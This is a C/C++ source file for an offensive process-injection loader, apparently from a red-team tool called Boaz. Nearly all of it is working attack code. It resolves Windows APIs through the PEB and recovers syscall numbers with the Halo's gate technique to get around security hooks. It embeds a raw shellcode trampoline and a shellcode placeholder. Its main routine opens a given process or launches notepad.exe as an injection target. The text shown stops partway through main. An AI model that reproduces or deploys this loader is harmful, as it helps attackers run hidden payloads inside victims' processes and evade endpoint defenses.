/**
Editor: Thomas X Meng
T1055 Process Injection
Custom Stack PI (remote)

Jump code example, decoy
# Date 2023
#
# This file is part of the Boaz tool
# Copyright (c) 2019-2024 Thomas M
# Licensed under the GPLv3 or later.
# update support argument -bin position_independent_code.bin as input instead of hardcoded code. 
**/
/***

*/
#include <windows.h>
#include <stdio.h>
#include <winternl.h>



/** original code by: Alice Climent-Pommeret */

void * GetFunctionAddress(const char * MyNtdllFunction, PVOID MyDLLBaseAddress) {

	DWORD j;
	uintptr_t RVA = 0;
	
	//Parse DLL loaded in memory
	const LPVOID BaseDLLAddr = (LPVOID)MyDLLBaseAddress;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) BaseDLLAddr;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) BaseDLLAddr + pImgDOSHead->e_lfanew);

    	//Get the Export Directory Structure
	PIMAGE_EXPORT_DIRECTORY pImgExpDir =(PIMAGE_EXPORT_DIRECTORY)((LPBYTE)BaseDLLAddr+pImgNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    	//Get the functions RVA array
	PDWORD Address=(PDWORD)((LPBYTE)BaseDLLAddr+pImgExpDir->AddressOfFunctions);

    	//Get the function names array 
	PDWORD Name=(PDWORD)((LPBYTE)BaseDLLAddr+pImgExpDir->AddressOfNames);

    	//get the Ordinal array
	PWORD Ordinal=(PWORD)((LPBYTE)BaseDLLAddr+pImgExpDir->AddressOfNameOrdinals);

	//Get RVA of the function from the export table
	for(j=0;j<pImgExpDir->NumberOfNames;j++){
        	if(!strcmp(MyNtdllFunction,(char*)BaseDLLAddr+Name[j])){
			//if function name found, we retrieve the RVA
         		// RVA = (uintptr_t)((LPBYTE)Address[Ordinal[j]]);
                RVA = Address[Ordinal[j]];

			break;
		}
	}
	
    	if(RVA){
		//Compute RVA to find the current address in the process
	    	uintptr_t moduleBase = (uintptr_t)BaseDLLAddr;
	    	uintptr_t* TrueAddress = (uintptr_t*)(moduleBase + RVA);
	    	return (PVOID)TrueAddress;
    	}else{
        	return (PVOID)RVA;
    	}
}

void * DLLViaPEB(wchar_t * DllNameToSearch){

    	PPEB pPeb = 0;
	PLDR_DATA_TABLE_ENTRY pDataTableEntry = 0;
	PVOID DLLAddress = 0;

	//Retrieve from the TEB (Thread Environment Block) the PEB (Process Environment Block) address
    	#ifdef _M_X64
        //If 64 bits architecture
        	PPEB pPEB = (PPEB) __readgsqword(0x60);
    	#else
        //If 32 bits architecture
        	PPEB pPEB = (PPEB) __readfsdword(0x30);
    	#endif

	//Retrieve the PEB_LDR_DATA address
	PPEB_LDR_DATA pLdr = pPEB->Ldr;

	//Address of the First PLIST_ENTRY Structure
    	PLIST_ENTRY AddressFirstPLIST = &pLdr->InMemoryOrderModuleList;

	//Address of the First Module which is the program itself
	PLIST_ENTRY AddressFirstNode = AddressFirstPLIST->Flink;

    	//Searching through all module the DLL we want
	for (PLIST_ENTRY Node = AddressFirstNode; Node != AddressFirstPLIST ;Node = Node->Flink) // Node = Node->Flink is the next module
	{
		// Node is pointing to InMemoryOrderModuleList in the LDR_DATA_TABLE_ENTRY structure.
        	// InMemoryOrderModuleList is at the second position in this structure.
		// To cast in the proper type, we need to go at the start of the structure.
        	// To do so, we need to subtract 1 byte. Indeed, InMemoryOrderModuleList is at 0x008 from the start of the structure) 
		Node = Node - 1;

        	// DataTableEntry structure
		pDataTableEntry = (PLDR_DATA_TABLE_ENTRY)Node;

        	// Retrieve de full DLL Name from the DataTableEntry
        	wchar_t * FullDLLName = (wchar_t *)pDataTableEntry->FullDllName.Buffer;

        	//We lower the full DLL name for comparaison purpose
        	for(int size = wcslen(FullDLLName), cpt = 0; cpt < size ; cpt++){
            		FullDLLName[cpt] = tolower(FullDLLName[cpt]);
        	}

        	// We check if the full DLL name is the one we are searching
        	// If yes, return  the dll base address
        	if(wcsstr(FullDLLName, DllNameToSearch) != NULL){
            		DLLAddress = (PVOID)pDataTableEntry->DllBase;
            		return DLLAddress;
        	}

		// Now, We need to go at the original position (InMemoryOrderModuleList), to be able to retrieve the next Node with ->Flink
		Node = Node + 1;
	}

    	return DLLAddress;
}

/* API retrival end.*/



typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);

//define SimpleSleep
void SimpleSleep(DWORD dwMilliseconds);


typedef NTSTATUS (NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID (NTAPI* TPPOSTWORK)(PTP_WORK);
typedef VOID (NTAPI* TPRELEASEWORK)(PTP_WORK);

typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtAllocateVirtualMemory;   // pointer to NtAllocateVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID* address;                      // PVOID *BaseAddress - rdx; ULONG_PTR ZeroBits - 0 - r8
    PSIZE_T size;                        // PSIZE_T RegionSize - r9; ULONG AllocationType - MEM_RESERVE|MEM_COMMIT = 3000 - stack pointer
    ULONG permissions;                   // ULONG Protect - PAGE_EXECUTE_READ - 0x20 - stack pointer
} NTALLOCATEVIRTUALMEMORY_ARGS, *PNTALLOCATEVIRTUALMEMORY_ARGS;

typedef struct _NTWRITEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtWriteVirtualMemory;      // pointer to NtWriteVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID address;                       // PVOID BaseAddress - rdx
    PVOID buffer;                        // PVOID Buffer - r8
    SIZE_T size;                         // SIZE_T NumberOfBytesToWrite - r9
    ULONG bytesWritten;
} NTWRITEVIRTUALMEMORY_ARGS, *PNTWRITEVIRTUALMEMORY_ARGS;

// protect virtual memory: 
typedef struct _NTPROTECTVIRTUALMEMORY_ARGS {
    UINT_PTR pNtProtectVirtualMemory;    // pointer to NtProtectVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID* address;                      // PVOID *BaseAddress - rdx
    PSIZE_T size;                        // PSIZE_T RegionSize - r8
    ULONG newProtect;                    // ULONG NewProtect - r9
    PULONG oldProtect;                   // PULONG OldProtect - stack
} NTPROTECTVIRTUALMEMORY_ARGS, *PNTPROTECTVIRTUALMEMORY_ARGS;


typedef NTSTATUS(NTAPI* myNtTestAlert)(
    VOID
);

typedef struct _NTTESTALERT_ARGS {
    UINT_PTR pNtTestAlert;          // pointer to NtTestAlert - rax
} NTTESTALERT_ARGS, *PNTTESTALERT_ARGS;

// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ne-processthreadsapi-queue_user_apc_flags
typedef enum _QUEUE_USER_APC_FLAGS {
  QUEUE_USER_APC_FLAGS_NONE,
  QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
  QUEUE_USER_APC_CALLBACK_DATA_CONTEXT
} QUEUE_USER_APC_FLAGS;

typedef struct _NTQUEUEAPCTHREADEX_ARGS {
    UINT_PTR pNtQueueApcThreadEx;          // pointer to NtQueueApcThreadEx - rax
    HANDLE hThread;                         // HANDLE ThreadHandle - rcx
    HANDLE UserApcReserveHandle;            // HANDLE UserApcReserveHandle - rdx
    QUEUE_USER_APC_FLAGS QueueUserApcFlags; // QUEUE_USER_APC_FLAGS QueueUserApcFlags - r8
    PVOID ApcRoutine;                       // PVOID ApcRoutine - r9
    // PVOID SystemArgument1;                  // PVOID SystemArgument1 - stack pointer
    // PVOID SystemArgument2;                  // PVOID SystemArgument2 - stack pointer
    // PVOID SystemArgument3;                  // PVOID SystemArgument3 - stack pointer
} NTQUEUEAPCTHREADEX_ARGS, *PNTQUEUEAPCTHREADEX_ARGS;

typedef NTSTATUS (NTAPI *NtQueueApcThreadEx_t)(
    HANDLE ThreadHandle,
    HANDLE UserApcReserveHandle, // Additional parameter in Ex2
    QUEUE_USER_APC_FLAGS QueueUserApcFlags, // Additional parameter in Ex2
    PVOID ApcRoutine
);



// WorkCallback functions: 
extern "C" {
    VOID CALLBACK AllocateMemory(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK WriteProcessMemoryCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK ProtectMemory(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK RtlUserThreadStartCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK BaseThreadInitThunkCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK BaseThreadInitXFGThunkCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK NtQueueApcThreadCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK NtTestAlertCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
}


PVOID findSyscallInstruction(const char* apiName, FARPROC pApi, int occurrence)
{
    if (!pApi) {
        printf("[-] Invalid function pointer passed for %s.\n", apiName);
        return NULL;
    }


    printf("[+] Searching for syscall #%d in %s @ %p\n", occurrence, apiName, pApi);

    const unsigned char syscall_pattern[] = { 0x0F, 0x05 }; //or also checks 0xC3 for ret 
    BYTE* addr = (BYTE*)pApi;
    BYTE* end  = addr + 0x100;

    int found = 0;
    while (addr <= end - sizeof(syscall_pattern)) {
        if (addr[0] == syscall_pattern[0] && addr[1] == syscall_pattern[1]) {
            found++;
            if (found == occurrence) {
                printf("[+] Found syscall #%d for %s at %p\n", occurrence, apiName, addr);
                return addr;
            }
        }
        addr++;
    }

    printf("[-] Only found %d syscall(s), syscall #%d not found for %s\n", found, occurrence, apiName);
    return NULL;
}

extern "C" {
    DWORD SSNAllocateVirtualMemory;
    DWORD SSNWriteVirtualMemory;
    DWORD SSNCreateThreadEx;
    DWORD SSNProtectVirtualMemory;
    DWORD SSNWaitForSingleObject;
}

// Halo's gate syscall
#define UP -32
#define DOWN 32
WORD GetsyscallNum(LPVOID addr) {


    WORD syscall = 0;

    if (*((PBYTE)addr) == 0x4c
        && *((PBYTE)addr + 1) == 0x8b
        && *((PBYTE)addr + 2) == 0xd1
        && *((PBYTE)addr + 3) == 0xb8
        && *((PBYTE)addr + 6) == 0x00
        && *((PBYTE)addr + 7) == 0x00) {

        BYTE high = *((PBYTE)addr + 5);
        BYTE low = *((PBYTE)addr + 4);
        syscall = (high << 8) | low;

        return syscall;

    }

    // Detects if 1st, 3rd, 8th, 10th, 12th instruction is a JMP
    if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 ||
        *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {

        for (WORD idx = 1; idx <= 500; idx++) {
            if (*((PBYTE)addr + idx * DOWN) == 0x4c
                && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b
                && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1
                && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8
                && *((PBYTE)addr + 6 + idx * DOWN) == 0x00
                && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {
                BYTE high = *((PBYTE)addr + 5 + idx * DOWN);
                BYTE low = *((PBYTE)addr + 4 + idx * DOWN);
                syscall = (high << 8) | low - idx;

                return syscall;
            }
            if (*((PBYTE)addr + idx * UP) == 0x4c
                && *((PBYTE)addr + 1 + idx * UP) == 0x8b
                && *((PBYTE)addr + 2 + idx * UP) == 0xd1
                && *((PBYTE)addr + 3 + idx * UP) == 0xb8
                && *((PBYTE)addr + 6 + idx * UP) == 0x00
                && *((PBYTE)addr + 7 + idx * UP) == 0x00) {
                BYTE high = *((PBYTE)addr + 5 + idx * UP);
                BYTE low = *((PBYTE)addr + 4 + idx * UP);

                syscall = (high << 8) | low + idx;

                return syscall;

            }

        }

    }
}

BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}

BOOL MaskCompare(const BYTE* pData, const BYTE* bMask, const char* szMask)
{
    for (; *szMask; ++szMask, ++pData, ++bMask)
        if (*szMask == 'x' && *pData != *bMask)
            return FALSE;
    return TRUE;
}

DWORD_PTR FindPattern(DWORD_PTR dwAddress, DWORD dwLen, PBYTE bMask, PCHAR szMask)
{
    for (DWORD i = 0; i < dwLen; i++)
        if (MaskCompare((PBYTE)(dwAddress + i), bMask, szMask))
            return (DWORD_PTR)(dwAddress + i);

    return 0;
}


unsigned char trampoline[] = 
"\x41\x55\xb9\xf0\x1d\xd3\xad\x41\x54\x55\x57\x56\x53\x48\x83\xec"
"\x48\xe8\x7a\x01\x00\x00\xb9\x53\x17\xe6\x70\x48\x89\xc3\xe8\x6d"
"\x01\x00\x00\x48\x89\xc6\x48\x85\xdb\x74\x56\x48\x89\xd9\xba\xda"
"\xb3\xf1\x0d\xe8\xa9\x01\x00\x00\x48\x89\xd9\xba\x97\x1b\x2e\x51"
"\x48\x89\xc7\xe8\x99\x01\x00\x00\x48\x89\xd9\xba\x8a\x90\x6b\x5b"
"\xe8\x8c\x01\x00\x00\x48\x89\xd9\xba\xb9\x90\xaf\xfb\x49\x89\xc5"
"\xe8\x7c\x01\x00\x00\x48\x89\xd9\xba\xdb\x0c\x72\x68\xe8\x6f\x01"
"\x00\x00\xba\xe7\x28\xb9\xfd\x48\x89\xd9\xe8\x62\x01\x00\x00\xeb"
"\x05\x45\x31\xed\x31\xff\x48\x85\xf6\x74\x32\xba\x37\x8c\xc5\x3f"
"\x48\x89\xf1\xe8\x49\x01\x00\x00\xba\xb2\x5a\x91\x4d\x48\x89\xf1"
"\x49\x89\xc4\xe8\x39\x01\x00\x00\xba\x4d\xff\xa9\x27\x48\x89\xf1"
"\x48\x89\xc5\xe8\x29\x01\x00\x00\x48\x89\xc3\xeb\x07\x31\xdb\x31"
"\xed\x45\x31\xe4\xba\x00\x10\x00\x00\x48\x83\xc9\xff\xff\xd7\x48"
"\x8b\x35\xaa\x01\x00\x00\x48\x8d\x44\x24\x34\x48\x83\xc9\xff\x48"
"\x89\x44\x24\x20\x41\xb9\x20\x00\x00\x00\x49\xb8\x11\x11\x11\x11"
"\x11\x11\x11\x11\x48\x89\xf2\x41\xff\xd5\x31\xc0\x48\x89\xf2\x45"
"\x31\xc9\x45\x31\xc0\x48\x8d\x4c\x24\x38\x48\x89\x44\x24\x38\x41"
"\xff\xd4\x48\x8b\x4c\x24\x38\xff\xd5\x48\x8b\x4c\x24\x38\xff\xd3"
"\x83\xca\xff\x48\x83\xc9\xff\xff\xd7\x48\x83\xc4\x48\x5b\x5e\x5f"
"\x5d\x41\x5c\x41\x5d\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x49\x89\xc9\xb8\x05\x15\x00\x00\x45\x8a\x01\x48\x85\xd2\x75\x06"
"\x45\x84\xc0\x75\x16\xc3\x45\x89\xca\x41\x29\xca\x49\x39\xd2\x73"
"\x23\x45\x84\xc0\x75\x05\x49\xff\xc1\xeb\x0a\x41\x80\xf8\x60\x76"
"\x04\x41\x83\xe8\x20\x6b\xc0\x21\x45\x0f\xb6\xc0\x49\xff\xc1\x44"
"\x01\xc0\xeb\xc4\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x57\x56\x48\x89\xce\x53\x48\x83\xec\x20\x65\x48\x8b\x04\x25\x60"
"\x00\x00\x00\x48\x8b\x40\x18\x48\x8b\x78\x20\x48\x89\xfb\x0f\xb7"
"\x53\x48\x48\x8b\x4b\x50\xe8\x85\xff\xff\xff\x89\xc0\x48\x39\xf0"
"\x75\x06\x48\x8b\x43\x20\xeb\x11\x48\x8b\x1b\x48\x85\xdb\x74\x05"
"\x48\x39\xdf\x75\xd9\x48\x83\xc8\xff\x48\x83\xc4\x20\x5b\x5e\x5f"
"\xc3\x41\x57\x49\x89\xd7\x41\x56\x41\x55\x41\x54\x55\x31\xed\x57"
"\x56\x53\x48\x89\xcb\x48\x83\xec\x28\x48\x63\x41\x3c\x8b\xbc\x08"
"\x88\x00\x00\x00\x48\x01\xcf\x44\x8b\x77\x20\x44\x8b\x67\x1c\x44"
"\x8b\x6f\x24\x49\x01\xce\x3b\x6f\x18\x73\x31\x89\xee\x31\xd2\x41"
"\x8b\x0c\xb6\x48\x01\xd9\xe8\x15\xff\xff\xff\x4c\x39\xf8\x75\x18"
"\x48\x01\xf6\x48\x01\xde\x42\x0f\xb7\x04\x2e\x48\x8d\x04\x83\x42"
"\x8b\x04\x20\x48\x01\xd8\xeb\x04\xff\xc5\xeb\xca\x48\x83\xc4\x28"
"\x5b\x5e\x5f\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3\x90\x90\x90"
"\x55\x48\x89\xe5\xe8\x97\xfd\xff\xff\x48\x89\xec\x5d\xc3\xe8\x00"
"\x00\x00\x00\x58\x48\x83\xe8\x05\xc3\x0f\x1f\x80\x00\x00\x00\x00"
"\x88\x88\x88\x88\x88\x88\x88\x88\xc3\x90\x90\x90\x90\x90\x90\x90"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";


// "\x41\x55\xb9\xf0\x1d\xd3\xad\x41\x54\x55\x57\x56\x53\x48\x83\xec"
// "\x48\xe8\x7a\x01\x00\x00\xb9\x53\x17\xe6\x70\x48\x89\xc3\xe8\x6d"
// "\x01\x00\x00\x48\x89\xc6\x48\x85\xdb\x74\x56\x48\x89\xd9\xba\xda"
// "\xb3\xf1\x0d\xe8\xa9\x01\x00\x00\x48\x89\xd9\xba\x97\x1b\x2e\x51"
// "\x48\x89\xc7\xe8\x99\x01\x00\x00\x48\x89\xd9\xba\x8a\x90\x6b\x5b"
// "\xe8\x8c\x01\x00\x00\x48\x89\xd9\xba\xb9\x90\xaf\xfb\x49\x89\xc5"
// "\xe8\x7c\x01\x00\x00\x48\x89\xd9\xba\xdb\x0c\x72\x68\xe8\x6f\x01"
// "\x00\x00\xba\xe7\x28\xb9\xfd\x48\x89\xd9\xe8\x62\x01\x00\x00\xeb"
// "\x05\x45\x31\xed\x31\xff\x48\x85\xf6\x74\x32\xba\x37\x8c\xc5\x3f"
// "\x48\x89\xf1\xe8\x49\x01\x00\x00\xba\xb2\x5a\x91\x4d\x48\x89\xf1"
// "\x49\x89\xc4\xe8\x39\x01\x00\x00\xba\x4d\xff\xa9\x27\x48\x89\xf1"
// "\x48\x89\xc5\xe8\x29\x01\x00\x00\x48\x89\xc3\xeb\x07\x31\xdb\x31"
// "\xed\x45\x31\xe4\xba\x00\x10\x00\x00\x48\x83\xc9\xff\xff\xd7\x48"
// "\x8b\x35\xaa\x01\x00\x00\x48\x8d\x44\x24\x34\x48\x83\xc9\xff\x48"
// "\x89\x44\x24\x20\x41\xb9\x20\x00\x00\x00\x49\xb8\x11\x11\x11\x11"
// "\x11\x11\x11\x11\x48\x89\xf2\x41\xff\xd5\x31\xc0\x48\x89\xf2\x45"
// "\x31\xc9\x45\x31\xc0\x48\x8d\x4c\x24\x38\x48\x89\x44\x24\x38\x41"
// "\xff\xd4\x48\x8b\x4c\x24\x38\xff\xd5\x48\x8b\x4c\x24\x38\xff\xd3"
// "\xba\x00\x10\x00\x00\x48\x83\xc9\xff\xff\xd7\x48\x83\xc4\x48\x5b"
// "\x5e\x5f\x5d\x41\x5c\x41\x5d\xc3\x90\x90\x90\x90\x90\x90\x90\x90"
// "\x49\x89\xc9\xb8\x05\x15\x00\x00\x45\x8a\x01\x48\x85\xd2\x75\x06"
// "\x45\x84\xc0\x75\x16\xc3\x45\x89\xca\x41\x29\xca\x49\x39\xd2\x73"
// "\x23\x45\x84\xc0\x75\x05\x49\xff\xc1\xeb\x0a\x41\x80\xf8\x60\x76"
// "\x04\x41\x83\xe8\x20\x6b\xc0\x21\x45\x0f\xb6\xc0\x49\xff\xc1\x44"
// "\x01\xc0\xeb\xc4\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
// "\x57\x56\x48\x89\xce\x53\x48\x83\xec\x20\x65\x48\x8b\x04\x25\x60"
// "\x00\x00\x00\x48\x8b\x40\x18\x48\x8b\x78\x20\x48\x89\xfb\x0f\xb7"
// "\x53\x48\x48\x8b\x4b\x50\xe8\x85\xff\xff\xff\x89\xc0\x48\x39\xf0"
// "\x75\x06\x48\x8b\x43\x20\xeb\x11\x48\x8b\x1b\x48\x85\xdb\x74\x05"
// "\x48\x39\xdf\x75\xd9\x48\x83\xc8\xff\x48\x83\xc4\x20\x5b\x5e\x5f"
// "\xc3\x41\x57\x49\x89\xd7\x41\x56\x41\x55\x41\x54\x55\x31\xed\x57"
// "\x56\x53\x48\x89\xcb\x48\x83\xec\x28\x48\x63\x41\x3c\x8b\xbc\x08"
// "\x88\x00\x00\x00\x48\x01\xcf\x44\x8b\x77\x20\x44\x8b\x67\x1c\x44"
// "\x8b\x6f\x24\x49\x01\xce\x3b\x6f\x18\x73\x31\x89\xee\x31\xd2\x41"
// "\x8b\x0c\xb6\x48\x01\xd9\xe8\x15\xff\xff\xff\x4c\x39\xf8\x75\x18"
// "\x48\x01\xf6\x48\x01\xde\x42\x0f\xb7\x04\x2e\x48\x8d\x04\x83\x42"
// "\x8b\x04\x20\x48\x01\xd8\xeb\x04\xff\xc5\xeb\xca\x48\x83\xc4\x28"
// "\x5b\x5e\x5f\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3\x90\x90\x90"
// "\x55\x48\x89\xe5\xe8\x97\xfd\xff\xff\x48\x89\xec\x5d\xc3\xe8\x00"
// "\x00\x00\x00\x58\x48\x83\xe8\x05\xc3\x0f\x1f\x80\x00\x00\x00\x00"
// "\x88\x88\x88\x88\x88\x88\x88\x88\xc3\x90\x90\x90\x90\x90\x90\x90"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
// "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

// -bin: 
unsigned char* magic_code = NULL;
SIZE_T allocatedSize = 0; 

unsigned char magiccode[] = ####SHELLCODE####;

// -bin
BOOL ReadContents(PCWSTR Filepath, unsigned char** magiccode, SIZE_T* magiccodeSize);


int main(int argc, char *argv[]) {


    // unsigned char magiccode[] = 


    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    DWORD pid = 0;
    char notepadPath[256] = {0};  // Initialize the buffer

    PCWSTR binPath = nullptr;
    // Parse -pid and -bin
    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "-pid") == 0) {
            if (i + 1 < argc && argv[i + 1][0] >= '0' && argv[i + 1][0] <= '9') {
                pid = atoi(argv[i + 1]);
                i++; // skip PID argument
            }
        } else if (strcmp(argv[i], "-bin") == 0) {
            if (i + 1 >= argc || argv[i + 1][0] == '-') {
                fprintf(stderr, "[-] Error: '-bin' flag requires a valid file path argument.\n");
                fprintf(stderr, "    Usage: loader.exe [-pid <pid>] -bin <path_to_magiccode>\n");
                exit(1);
            }
            size_t wlen = strlen(argv[i + 1]) + 1;
            wchar_t* wpath = new wchar_t[wlen];
            mbstowcs(wpath, argv[i + 1], wlen);
            binPath = wpath;
            i++; // skip bin path
        }
    }

    // If PID was provided, open handles
    if (pid > 0) {
        printf("[+] PID provided: %lu\n", (unsigned long)pid);

        // get pi information from pid:
        pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        pi.hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pid);
    } else {
        
        printf("[-] PID not provided or invalid, launching default process\n");

        if (IsSystem64Bit()) {
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
            // strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\RuntimeBroker.exe");
            // or svchost.exe
        } else {
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
        }

        BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        if (!success) {
            MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
            return 1;
        }
        printf("Notepad started with default settings.\n");
        pid = pi.dwProcessId;
        printf("[+] notepad PID: %lu\n", (unsigned long)pid);
